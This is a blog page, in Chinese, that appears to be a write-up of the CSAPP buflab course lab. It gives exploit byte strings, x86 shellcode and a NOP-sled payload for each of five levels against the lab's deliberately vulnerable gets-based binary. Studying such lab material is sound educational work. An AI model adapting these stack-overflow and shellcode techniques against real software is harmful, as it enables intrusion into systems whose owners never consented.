@@ -1,0 +1,869 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CSAPP,缓冲区溢出," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CSAPP-buflab缓冲区溢出实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP-buflab">
+<meta property="og:url" content="http://yoursite.com/2019/06/03/CSAPP-buflab/index.html">
+<meta property="og:site_name" content="0pa9ue">
+<meta property="og:description" content="CSAPP-buflab缓冲区溢出实验">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture1.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture4.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture0.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture2.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture3.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture4.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture5.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture7.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture8.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture10.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture11.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture14.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture15.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture17.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture18.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture15.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture21.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture23.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture24.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture25.png">
+<meta property="og:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture26.png">
+<meta property="article:published_time" content="2019-06-03T04:35:13.000Z">
+<meta property="article:modified_time" content="2019-06-06T13:42:46.871Z">
+<meta property="article:author" content="0pa9ue">
+<meta property="article:tag" content="CSAPP">
+<meta property="article:tag" content="缓冲区溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/06/03/CSAPP-buflab/Picture1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/06/03/CSAPP-buflab/"/>
+
+
+
+
+
+  <title>CSAPP-buflab | 0pa9ue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0pa9ue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/CSAPP-buflab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0pa9ue">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0pa9ue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSAPP-buflab</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-03T12:35:13+08:00">
+                2019-06-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> Views
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.8k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  8
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>CSAPP-buflab缓冲区溢出实验</strong></p>
+<a id="more"></a>
+<h3 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a>先决条件：</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture1.png" alt></p>
+<p>因为getbuf函数在使用gets读取字符，并赋值给buf数组时，没有进行长度的检查，导致可以输入任意多的字符，实现缓冲区的溢出漏洞的利用和攻击</p>
+<p><strong>getbuf中buf首地址</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture4.png" alt></p>
+<p><strong>函数调用-栈帧</strong><br><img src="/2019/06/03/CSAPP-buflab/Picture0.png" alt></p>
+<h3 id="level0-Candle"><a href="#level0-Candle" class="headerlink" title="level0: Candle"></a>level0: Candle</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture2.png" alt><br><img src="/2019/06/03/CSAPP-buflab/Picture3.png" alt></p>
+<p><strong>任务：</strong></p>
+<p>当getbuf执行完后，需要返回到smoke函数而不是test函数。同时也不用担心test栈帧的损坏，因为smoke函数中有exit可以退出程序。</p>
+<p><strong>原理：</strong></p>
+<p>当test调用getbuf函数后，程序会开启一个新的栈帧</p>
+<p>而程序在执行完getbuf函数后，按照原有的步骤是收回getbuf的栈帧，并恢复test函数的栈帧</p>
+<p>所以我们只需要在getbuf的栈帧进行回收的时候，将其跳转地址改为getbuf即可</p>
+<p>通过调试，找到buf数组的首地址为<strong>ebp-0x28</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture4.png" alt></p>
+<p>那么buf栈帧中<strong>ebp-0x29</strong>到<strong>ebp-0x2c</strong>为保存的旧的ebp，</p>
+<p><strong>ebp-0x2d</strong>到<strong>ebp-0x30</strong>为getbuf函数的返回地址<img src="/2019/06/03/CSAPP-buflab/Picture5.png" alt></p>
+<p>虽然说0x08048e0a为smoke的地址，但是因为0x0a是换行符，会被gets函数认为是字符串的结束，导致exp不完整，所以需要向下取地址</p>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">0b 8e 04 08</span><br></pre></td></tr></table></figure>
+
+<h3 id="level1-Sparkler"><a href="#level1-Sparkler" class="headerlink" title="level1: Sparkler"></a>level1: Sparkler</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture7.png" alt></p>
+<p><strong>任务：</strong></p>
+<p>与level0相似的功能，但是需要传递给fizz的参数val为你自己的cookies</p>
+<p><strong>原理：</strong></p>
+<p>程序在进行函数调用的过程中，如果需要进行参数的传递，会将需要传递的参数放在调用者的栈帧中，然后再进行函数的调用</p>
+<p>所以在这里只需要找到传递参数val在被调用者栈帧中的位置即可（ebp+0x8）</p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture8.png" alt></p>
+<p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">af 8d 04 08 </span><br><span class="line">30 31 32 33 </span><br><span class="line">64 84 36 37</span><br></pre></td></tr></table></figure>
+
+<p>0x08038daf为fizz函数的地址，0x37368464为cookies</p>
+<h3 id="level2-Firecracker"><a href="#level2-Firecracker" class="headerlink" title="level2: Firecracker"></a>level2: Firecracker</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture10.png" alt><br><img src="/2019/06/03/CSAPP-buflab/Picture11.png" alt></p>
+<p><strong>任务：</strong></p>
+<p>与level1相似，但是需要设置全局变量global_value的值为cookies，并需要跳转到bang函数</p>
+<p><strong>原理：</strong></p>
+<p>模拟寄存器来设置全局变量global_value和函数返回</p>
+<p><strong>shellcode：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">movl %eax,0x0804d10c</span><br><span class="line">push $0x08048d52</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+
+<p>因为需要执行字节码的功能，所以要将返回值更改为buf数组的首地址</p>
+<p>执行完全局变量的赋值操作后，将bang函数的首地址推入栈，再ret，即能返回到bang函数中</p>
+<p><strong>bang首地址：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture14.png" alt></p>
+<p><strong>buf首地址：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture15.png" alt></p>
+<p><strong>exp:</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 </span><br><span class="line">30 31 32 33</span><br><span class="line">68 3a 68 55</span><br></pre></td></tr></table></figure>
+
+<p>字节码16 + 28 + 返回地址4 = 48</p>
+<h3 id="level3-Dynamite"><a href="#level3-Dynamite" class="headerlink" title="level3: Dynamite"></a>level3: Dynamite</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture17.png" alt></p>
+<p><strong>任务：</strong></p>
+<p>要求调用getbuf后，返回到test当中，但是不能破坏为test函数维护的堆栈状态（test函数加了堆栈状态检测），同时要让test函数调用getbuf后的返回值（val）为自己的cookie。</p>
+<p><strong>原理：</strong></p>
+<p>因为函数调用后的返回值保存在eax中，所以可以模拟寄存器将cookies写入eax中</p>
+<p>调用getbuf函数后的返回地址(0x08048e50)：<br><img src="/2019/06/03/CSAPP-buflab/Picture18.png" alt></p>
+<p><strong>shellcode：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">push $0x08048e50</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+
+<p>同时要保持test栈帧的完整性，也就是在执行完exp后pc要返回到test栈帧中调用getbuf函数的下一个地址，保证test函数的正常运行和结束</p>
+<p><strong>buf首地址：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture15.png" alt></p>
+<p><strong>test栈帧中的ebp（保存的旧的ebp）：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture21.png" alt></p>
+<p><strong>exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 39 </span><br><span class="line">30 31 32 33 34 35 36 37 38 </span><br><span class="line">c0 3a 68 55</span><br><span class="line">68 3a 68 55</span><br></pre></td></tr></table></figure>
+
+<h3 id="level4-Nitroglycerin"><a href="#level4-Nitroglycerin" class="headerlink" title="level4: Nitroglycerin"></a>level4: Nitroglycerin</h3><p><img src="/2019/06/03/CSAPP-buflab/Picture23.png" alt></p>
+<p><strong>任务：</strong></p>
+<p>因为程序在运行的过程中，对于每一个用户而言，其对应的栈指针的位置其实大概率是不相同的</p>
+<p>在这一题中，使用的是testn和getbufn函数，testn调用5次getbufn函数，每次调用getbufn函数时，其栈基址ebp是随机分配的</p>
+<p>调用5次getbufn函数中，每次都要正确返回到testn函数中，返回值为cookies，并且不能破坏testn的栈帧</p>
+<p><strong>步骤：</strong></p>
+<p>参考nop<br>sleds的原理和攻击方法，在需要执行的shellcode前加入大量的nop指令，只需要返回地址返回到nop指令中，那么就能够经过一系列的nop操作滑行到我们最终需要执行的shellcode中，执行shellcode命令</p>
+<p>只需要找到每次调用getbufn中的buf数组的最高首地址即可（buf数组为520字节）</p>
+<p>同时因为ebp的随机化，我们只能使用ebp与esp的相对位置来确定ebp</p>
+<p><strong>调用getbufn后的返回地址：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture24.png" alt></p>
+<p><strong>最大地址：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture25.png" alt><br>最大地址为0x556838e8</p>
+<p><strong>esp与ebp的相对位置：</strong></p>
+<p><img src="/2019/06/03/CSAPP-buflab/Picture26.png" alt><br>push ebx 后ebp与esp差4，sub esp 0x24后ebp与esp差0x28</p>
+<p><strong>shellcode：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x37368464,%eax</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push $0x8048ce2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+
+<p><strong>字节码：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 64 84 36 37 </span><br><span class="line">8d 6c 24 28 </span><br><span class="line">68 e2 8c 04 08 </span><br><span class="line">c3</span><br></pre></td></tr></table></figure>
+
+<p><strong>exp：</strong><br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
+<p>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
+<p>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
+<p>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
+<p>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90<br>90 90 90 90 90 90 90 90 90 90</p>
+<p>90 90 90 90 90 90 90 90 90 </p>
+<p>b8 64 84 36 37<br>8d 6c 24 28<br>68 e2 8c 04 08<br>c3 </p>
+<p>e8 38 68 55</p>
+<p>509nop指令 + 15字节码 + 4最大返回地址 = 528</p>
+<p>在getbufn执行完leave和ret后，需要将ebp和esp恢复到他们在testn栈帧中的原来的位置，但是因为ebp是变化的，所以需要使用esp和ebp的相对位置来确定ebp的位置。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CSAPP/" rel="tag"># CSAPP</a>
+          
+            <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag"># 缓冲区溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/26/RCTF2019/" rel="next" title="RCTF2019 writeup">
+                <i class="fa fa-chevron-left"></i> RCTF2019 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/06/ciscn2019/" rel="prev" title="ciscn2019 writeup">
+                ciscn2019 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">0pa9ue</p>
+              <p class="site-description motion-element" itemprop="description">stay hungry, stay foolish</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#先决条件："><span class="nav-number">1.</span> <span class="nav-text">先决条件：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level0-Candle"><span class="nav-number">2.</span> <span class="nav-text">level0: Candle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level1-Sparkler"><span class="nav-number">3.</span> <span class="nav-text">level1: Sparkler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level2-Firecracker"><span class="nav-number">4.</span> <span class="nav-text">level2: Firecracker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-Dynamite"><span class="nav-number">5.</span> <span class="nav-text">level3: Dynamite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4-Nitroglycerin"><span class="nav-number">6.</span> <span class="nav-text">level4: Nitroglycerin</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0pa9ue</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">44.4k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
